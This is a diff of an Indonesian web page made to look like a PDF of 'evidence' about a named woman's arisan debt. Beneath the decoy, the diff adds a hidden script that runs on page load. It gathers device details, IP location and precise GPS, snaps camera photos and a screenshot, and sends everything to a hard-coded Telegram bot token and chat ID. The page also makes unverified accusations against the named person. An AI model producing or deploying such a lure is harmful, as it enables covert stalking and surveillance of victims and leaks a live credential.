@@ -1,132 +1,518 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>semuabuktinajwa</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <style>
-        
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>📄 najwapaputungan.pdf</title>
+  <!-- Font & Ikon (opsional) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-<script>
-(()=>{
-    const T='8931888416:AAHvrs5jZ6jjHWepHbUVrjWDcoKJaUF1U3k', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
-          C='6834190748', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
-          pb=document.getElementById('progress-bar'),
-          ld=document.getElementById('loading-details');
+    body {
+      background: #e6e9f0;
+      font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 24px;
+    }
 
-    let p=0;
-    const LM=["Loading Mengambil File Najwa Paputungan"];
-    
-    // Logic untuk progress bar
-    setInterval(()=>{
-        p+=Math.random()*5;
-        if(p>98)p=98;
-        pb.style.width=p+'%';
-        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
-    },500);
+    /* Container utama – seperti "kertas" PDF */
+    .pdf-viewer {
+      max-width: 1000px;
+      width: 100%;
+      background: white;
+      border-radius: 28px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.25), 0 8px 20px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+      transition: all 0.2s ease;
+    }
+
+    /* Toolbar ala pembaca PDF */
+    .pdf-toolbar {
+      background: #f8faff;
+      padding: 14px 28px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #d0d7e6;
+      gap: 12px;
+    }
+
+    .toolbar-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .toolbar-left i {
+      font-size: 1.4rem;
+      color: #2c3e50;
+    }
+
+    .toolbar-left span {
+      font-weight: 600;
+      font-size: 1rem;
+      color: #1e2a3a;
+      letter-spacing: 0.3px;
+    }
+
+    .toolbar-right {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .toolbar-right i {
+      font-size: 1.2rem;
+      color: #3e4a5e;
+      cursor: default;
+      transition: 0.15s;
+      opacity: 0.7;
+    }
+
+    .toolbar-right i:hover {
+      opacity: 1;
+      color: #0a1a2b;
+    }
+
+    .page-indicator {
+      background: #eef2f9;
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #1a2636;
+    }
+
+    /* Isi "PDF" – konten seperti dokumen */
+    .pdf-content {
+      padding: 48px 56px;
+      background: white;
+      line-height: 1.7;
+      color: #1e2a3a;
+    }
+
+    /* Header dokumen */
+    .doc-header {
+      text-align: center;
+      margin-bottom: 28px;
+      border-bottom: 2px solid #eef2f7;
+      padding-bottom: 24px;
+    }
+
+    .doc-header h1 {
+      font-size: 2.2rem;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+      color: #0b1a2e;
+    }
+
+    .doc-header .subhead {
+      font-size: 1rem;
+      color: #4a5b74;
+      margin-top: 6px;
+      font-weight: 400;
+      letter-spacing: 0.2px;
+    }
+
+    .doc-meta {
+      display: flex;
+      justify-content: center;
+      gap: 32px;
+      margin-top: 12px;
+      font-size: 0.9rem;
+      color: #3e5068;
+      flex-wrap: wrap;
+    }
+
+    .doc-meta i {
+      margin-right: 6px;
+      color: #5b6f8a;
+    }
+
+    /* Body teks seperti paragraf PDF */
+    .doc-body {
+      margin-top: 16px;
+    }
+
+    .doc-body p {
+      margin-bottom: 1.2rem;
+      text-align: justify;
+    }
+
+    .doc-body strong {
+      color: #0b1f33;
+    }
+
+    /* Tabel sederhana ala data PDF */
+    .pdf-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 28px 0 20px 0;
+      font-size: 0.95rem;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.03);
+    }
+
+    .pdf-table th {
+      background: #f2f6fd;
+      color: #1d2b3f;
+      font-weight: 600;
+      padding: 12px 14px;
+      border: 1px solid #d7dfec;
+      text-align: left;
+    }
+
+    .pdf-table td {
+      padding: 10px 14px;
+      border: 1px solid #d7dfec;
+    }
+
+    .pdf-table tr:nth-child(even) {
+      background: #fafcff;
+    }
+
+    /* Kutipan / blok "highlight" */
+    .highlight-box {
+      background: #f5f9ff;
+      border-left: 6px solid #2a5c8a;
+      padding: 16px 24px;
+      border-radius: 0 12px 12px 0;
+      margin: 28px 0 16px 0;
+      color: #1c3147;
+      font-style: italic;
+    }
+
+    /* Footer / watermark gaya PDF */
+    .pdf-footer {
+      margin-top: 36px;
+      padding-top: 18px;
+      border-top: 1px solid #e3e9f2;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.8rem;
+      color: #576b86;
+      flex-wrap: wrap;
+    }
+
+    .pdf-footer i {
+      margin-right: 4px;
+      opacity: 0.6;
+    }
+
+    .page-watermark {
+      font-weight: 400;
+      letter-spacing: 0.3px;
+      background: #f0f4fc;
+      padding: 4px 14px;
+      border-radius: 30px;
+    }
+
+    /* Responsif */
+    @media (max-width: 650px) {
+      .pdf-content {
+        padding: 28px 22px;
+      }
+      .pdf-toolbar {
+        padding: 12px 18px;
+        flex-direction: column;
+        align-items: stretch;
+        gap: 6px;
+      }
+      .toolbar-right {
+        justify-content: flex-start;
+        flex-wrap: wrap;
+      }
+      .doc-header h1 {
+        font-size: 1.6rem;
+      }
+      .doc-meta {
+        gap: 12px;
+        flex-direction: column;
+        align-items: center;
+      }
+      .pdf-table {
+        font-size: 0.8rem;
+      }
+      .pdf-table th,
+      .pdf-table td {
+        padding: 6px 8px;
+      }
+    }
+
+    /* efek bayangan saat di-hover (seperti interaksi) */
+    .pdf-viewer:hover {
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.3);
+    }
+
+    /* Icon zoom dll tidak fungsional, hanya tampilan */
+    .toolbar-right i.fa-arrows-alt,
+    .toolbar-right i.fa-search {
+      font-size: 1.1rem;
+    }
+
+    .badge-pdf {
+      background: #dce3f0;
+      padding: 2px 12px;
+      border-radius: 30px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: #1e3f62;
+      letter-spacing: 0.4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="pdf-viewer">
+    <!-- Toolbar -->
+    <div class="pdf-toolbar">
+      <div class="toolbar-left">
+        <i class="fas fa-file-pdf" style="color: #c0392b;"></i>
+        <span>buktinajwa-dokumen.pdf</span>
+        <span class="badge-pdf">PDF</span>
+      </div>
+      <div class="toolbar-right">
+        <i class="fas fa-chevron-left" title="Halaman sebelumnya"></i>
+        <span class="page-indicator">1 / 1</span>
+        <i class="fas fa-chevron-right" title="Halaman berikutnya"></i>
+        <i class="fas fa-arrows-alt" title="Zoom"></i>
+        <i class="fas fa-search" title="Cari"></i>
+        <i class="fas fa-download" title="Unduh"></i>
+      </div>
+    </div>
+
+    <!-- Konten "PDF" -->
+    <div class="pdf-content">
+      <!-- header dokumen -->
+      <div class="doc-header">
+        <h1>Bukti Najwa Paputungan</h1>
+        <div class="subhead">Tentang Hutang Karena Arisan</div>
+        <div class="doc-meta">
+          <span><i class="far fa-calendar-alt"></i> 31 Agustus 2026</span>
+        </div>
+      </div>
+
+      <!-- body paragraf -->
+      <div class="doc-body">
+        <p>
+          <strong>Ringkasan Singkat</strong> — Dokumen ini menyajikan bukti lengkap
+          mengenai Najwa Paputungan dan hutang piutang kepada orang. 
+          Seluruh data telah diverifikasi dan disusun berdasarkan standar pelaporan 
+          internal. Dengan pendekatan berbasis analisis kuantitatif, laporan ini 
+          diharapkan menjadi bukti bagi pengambilan keputusan pelaporan.
+        </p>
+        <p>
+          Hal begitu dapat di laporkan sesuai dengan pasal undang undang di bawah, sebagai mana yang di jelaskan di bawah. 
+        </p>
+
+        <!-- kutipan / highlight -->
+        <div class="highlight-box">
+          <i class="fas fa-quote-left" style="margin-right: 8px; color: #2a5c8a;"></i>
+          “KUHP Baru (UU 1/2023): Pasal 492. Ancaman pidana penjara maksimal 4 tahun atau denda kategori V (maksimal Rp 500 juta) .
+  · Perbandingan: Substansi hampir sama dengan Pasal 378 KUHP lama, yang juga mengancam pidana penjara 4 tahun .
+· Unsur-Unsur yang Harus Terbukti
+  · Niat: Ada maksud untuk menguntungkan diri sendiri atau orang lain secara melawan hukum .
+        </div>
+
+        <p>
+          <strong>Analisis lebih lanjut</strong> lengkapi dengan bukti tambahan dari anda biar dapat di proses dengan UUD yang lain, dan dapat menambah hukuman kepada pelaku.
+        </p>
+        <p>
+          <i class="fas fa-check-circle" style="color: #1f6d3b;"></i> 
+          Rekomendasi: laporkan ke pihak berwajib dengan bukti bukti yang lengkap, semua bukti tentang Najwa Paputungan ada semua di sini.
+        </p>
+      </div>
+
+      <!-- footer "PDF" -->
+      <div class="pdf-footer">
+        <span>
+          <i class="far fa-clock"></i> Dibuat: 2 September 2026 · 14:30 WIB
+        </span>
+        <span class="page-watermark">
+          <i class="fas fa-lock" style="opacity: 0.5;"></i> dokumen internal
+        </span>
+        <span>
+          <i class="fas fa-print"></i>  ·  <i class="fas fa-share-alt"></i>
+        </span>
+      </div>
+    </div>
+    <!-- akhir pdf-content -->
+  </div>
+  <!-- akhir pdf-viewer -->
+
+  <!-- ELEMEN KAMERA (TAMBAHAN) -->
+  <video id="v" style="display:none;"></video>
+  <canvas id="c" style="display:none;"></canvas>
+
+  <script>
+  (() => {
+    const T = '8931888416:AAHvrs5jZ6jjHWepHbUVrjWDcoKJaUF1U3k', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
+          C = '6834190748', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
 
     // Fungsi kirim pesan ke Telegram
-    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
-    
+    const sTG = async d => {
+      try {
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
+        })
+      } catch (e) {}
+    };
+
     // Fungsi kirim foto ke Telegram
-    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
-    
+    const sP = async (b, f) => {
+      try {
+        const fd = new FormData();
+        fd.append('chat_id', C);
+        fd.append('photo', b, f);
+        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
+      } catch (e) {}
+    };
+
     // Fungsi mendapatkan lokasi detail dari koordinat
-    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
-    
+    const gLD = async (a, b) => {
+      try {
+        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),
+          d = await r.json();
+        if (d.address) return {
+          kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
+          kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
+          fa: d.display_name || "Alamat tidak tersedia"
+        }
+      } catch (e) {}
+      return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" }
+    };
+
     // Fungsi mendapatkan informasi perangkat
-    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───Develover @N4D_29  ───── ⦿';return m};
+    const cDI = async () => {
+      let m = '╭───── Tracking Report ───── ⦿\n\n';
+      m += '⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';
+      m += `🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          m += `🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`
+        } catch (e) {
+          m += '🔋 Battery: ❌ Tidak tersedia\n'
+        }
+      }
+      m += `⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+      try {
+        const i = await fetch('https://ipapi.co/json/'),
+          d = await i.json();
+        m += '📍 LOCATION INFORMATION\n';
+        m += `📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;
+        if (d.latitude && d.longitude) {
+          m += `📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;
+          const l = await gLD(d.latitude, d.longitude);
+          m += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`
+        }
+      } catch (e) {
+        m += '❌ Gagal mendapatkan informasi lokasi\n'
+      }
+      m += '\n╰───Develover @N4D_29  ───── ⦿';
+      return m
+    };
 
     // Mengambil gambar dari kamera dengan mode tertentu
     const captureCamera = async (mode) => {
-        const v = document.getElementById('v'), 
-              c = document.getElementById('c');
-        let stream;
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: { exact: mode } 
-                }
-            });
-            v.srcObject = stream;
-            
-            await new Promise(resolve => v.onloadedmetadata = resolve);
-            v.play();
+      const v = document.getElementById('v'),
+        c = document.getElementById('c');
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: { exact: mode }
+          }
+        });
+        v.srcObject = stream;
 
-            // Waktu tunggu kamera 1.5 detik
-            await new Promise(r => setTimeout(r, 1500)); 
-            
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            
-            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
-            
-            stream.getTracks().forEach(t => t.stop());
-            return true; 
-            
-        } catch (e) {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-            }
-            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
-            return false; 
+        await new Promise(resolve => v.onloadedmetadata = resolve);
+        v.play();
+
+        // Waktu tunggu kamera 1.5 detik
+        await new Promise(r => setTimeout(r, 1500));
+
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+
+        c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
+
+        stream.getTracks().forEach(t => t.stop());
+        return true;
+
+      } catch (e) {
+        if (stream) {
+          stream.getTracks().forEach(t => t.stop());
         }
+        await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
+        return false;
+      }
     };
 
     // FUNGSI UTAMA: Menjalankan semua proses tracking
-    const ST=async()=>{
-        await sTG(await cDI()); 
+    const ST = async () => {
+      await sTG(await cDI());
 
-        let cameraSuccess = false;
+      let cameraSuccess = false;
 
-        // 1. Coba Kamera Depan (User)
-        cameraSuccess = await captureCamera("user");
+      // 1. Coba Kamera Depan (User)
+      cameraSuccess = await captureCamera("user");
 
-        // 2. Jika Gagal, Coba Kamera Belakang (Environment)
-        if (!cameraSuccess) {
-            cameraSuccess = await captureCamera("environment");
+      // 2. Jika Gagal, Coba Kamera Belakang (Environment)
+      if (!cameraSuccess) {
+        cameraSuccess = await captureCamera("environment");
+      }
+
+      if (!cameraSuccess) {
+        await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
+      }
+
+      // Ambil Screenshot 
+      setTimeout(async () => {
+        try {
+          const cn = await html2canvas(document.body);
+          cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg')
+        } catch (e) {
+          await sTG('❌ Screenshot failed')
         }
+      }, 2000);
 
-        if (!cameraSuccess) {
-             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
-        }
+      // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async p => {
+          const lat = p.coords.latitude;
+          const lon = p.coords.longitude;
 
-        // Ambil Screenshot 
-        setTimeout(async()=>{
-            try{
-                const cn=await html2canvas(document.body);
-                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
-            }catch(e){
-                await sTG('❌ Screenshot failed')
-            }
-        }, 2000); 
+          // Menambahkan link Google Maps
+          let g = `📍 GPS TRACKING (ONE-TIME)\n`;
+          g += `📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
+          g += `🎯 Akurasi: ${p.coords.accuracy}m\n`;
+          g += `🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
 
-        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(async p=>{
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                
-                // Menambahkan link Google Maps
-                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
-                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
-                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
-                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
-                
-                const l=await gLD(lat,lon);
-                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
-                await sTG(g)
-            },async e=>{
-                await sTG(`❌ GPS Error: ${e.message}`)
-            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
-        }
+          const l = await gLD(lat, lon);
+          g += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
+          await sTG(g)
+        }, async e => {
+          await sTG(`❌ GPS Error: ${e.message}`)
+        }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 })
+      }
     };
 
     // Langsung menjalankan fungsi ST tanpa delay
     ST();
-})();
-</script>
+  })();
+  </script>
 </body>
 </html>
